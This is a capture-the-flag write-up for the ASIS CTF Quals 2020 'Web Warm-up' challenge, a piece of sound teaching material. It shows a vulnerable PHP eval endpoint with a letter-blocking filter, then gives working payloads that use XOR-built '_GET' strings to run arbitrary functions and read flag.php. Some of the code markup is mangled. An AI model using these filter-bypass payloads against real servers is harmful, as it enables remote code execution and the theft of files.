<h1>ASIS CTF Quals 2020 â€“ Web Warm-up</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 33</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Warm up! Can you break all the tasks? I'll pray for you!</p>
  
  <p>read flag.php</p>
  
  <p>Link: http://69.90.132.196:5003/?view-source</p>
</blockquote>

<h2>Solution</h2>

<p>You have to read the <code>flag.php</code> file. Connecting to the URL you can see the following source code.</p>

<p>```php
<?php
if(isset($<em>GET['view-source'])){
    highlight</em>file(<strong>FILE</strong>);
    die();
}</p>

<p>if(isset($<em>GET['warmup'])){
    if(!preg</em>match('/[A-Za-z]/is',$<em>GET['warmup']) &amp;&amp; strlen($</em>GET['warmup']) &lt;= 60) {
    eval($_GET['warmup']);
    }else{
        die("Try harder!");
    }
}else{
    die("No param given");
}
```</p>

<p>There is an <code>eval</code> execution over the <code>warmup</code> GET parameter, but this parameter is checked in a very strict way, so there is no possibility to invoke functions directly.</p>

<p>Luckily, some techniques to bypass this kind of checks exist and <a href="https://github.com/m3ssap0/CTF-Writeups/blob/b83e31b155a13d642e527968a9375c295c6a6977/Inferno%20CTF%202019/Dank%20PHP/README.md">I've used them before</a>.</p>

<p>The best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. <code>_</code>.</p>

<p>I found two interesting websites:
* <a href="https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/">Bypass WAF - Php webshell without numbers and letters</a>;
* <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php/#preg_match-code-execution"><code>preg_match</code> Code Execution</a>.</p>

<p>In the second website, there is the same scenario of the challenge, so I used it to craft my payload.</p>

<p>Using bitwise XOR operation in PHP, you can craft <code>_GET</code> string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.</p>

<p><code>php
$_="`{{{"^"?&lt;&gt;/"; // This is: "_GET" string.
</code></p>

<p>Then you can specify the execution of the content of a GET parameter with the following code.</p>

<p><code>php
${$_}[_]();       // This is $_GET[_]()
</code></p>

<p>So the payload that will be executed by the <code>eval</code> instruction will be the following.</p>

<p><code>php
$_="`{{{"^"?&lt;&gt;/";${$_}[_]();
</code></p>

<p>Using a payload like the following, will let you to execute the <code>phpinfo</code> page.</p>

<p><code>
http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_]();&amp;_=phpinfo
</code></p>

<p>The complete payload is the following.</p>

<p><code>
http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;$_0=${$_}[_](${$_}[__]);${$_}[___]($_0);&amp;_=file_get_contents&amp;__=flag.php&amp;___=var_dump
</code></p>

<p>It can be composed step by step.</p>

<p><code>php
$_="`{{{"^"?&lt;&gt;/";          // This is _GET string representation composed before.
$_0=${$_}[_](${$_}[__]);   // This is $_0 = $_GET[_]($_GET[__]) and it is used to perform: file_get_contents("flag.php")
${$_}[___]($_0);           // This is $_GET[___]($_0) and it is used to perform: var_dump($_0)
</code></p>

<p>The result of the attack will be the following.</p>

<p><code>
string(46) "&lt;?php
$flag = "ASIS{w4rm_up_y0ur_br4in}";
?&gt;"
</code></p>
